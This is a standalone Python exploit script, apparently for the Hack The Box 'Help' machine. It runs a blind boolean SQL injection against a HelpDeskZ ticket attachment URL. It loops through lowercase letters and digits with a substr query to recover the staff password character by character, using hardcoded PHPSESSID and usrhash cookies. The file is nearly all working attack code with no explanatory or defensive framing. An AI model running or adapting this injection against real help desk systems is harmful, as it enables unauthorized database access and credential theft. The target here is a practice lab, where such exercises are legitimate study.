#!/usr/bin/python3

import string
import requests
import sys
import os
from pprint import pprint

def main():
    try:
        # url = "http://help.htb/support/?v="
        password = []

        cookies = {
                "PHPSESSID":"t690bg09b0h4s8t5n7nj7msln2",
                "usrhash":"0Nwx5jIdx%2BP2QcbUIv9qck4Tk2feEu8Z0J7rPe0d70BtNMpqfrbvecJupGimitjg3JjP1UzkqYH6QdYSl1tVZNcjd4B7yFeh6KDrQQ%2FiYFsjV6wVnLIF%2FaNh6SC24eT5OqECJlQEv7G47Kd65yVLoZ06smnKha9AGF4yL2Ylo%2BEFahZRNwSn13bZW5qbQcx%2BflKH0vTQ1cAIIstDSWAT8w%3D%3D",
                "lang":"english"
        }
        chars = list(string.ascii_lowercase)+ list(string.digits)
        sess = requests.Session()
        k = 1
        while k <= 40:
            for i in chars:
                payload = "http://help.htb/support/?v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6 and substr((select password from staff limit 0,1),{},1) = '{}'-- -".format(k, i)
                ress = sess.get(url=payload, cookies=cookies)
                if "404" not in ress.text:
                    password.append(i)
                    print("Password: "+''.join(password))
                    k += 1
                    break

    except Exception as e:
        print(str(e))
        exit(1)
    except KeyboardInterrupt:
        exit(0)


if __name__ == "__main__":
    main()
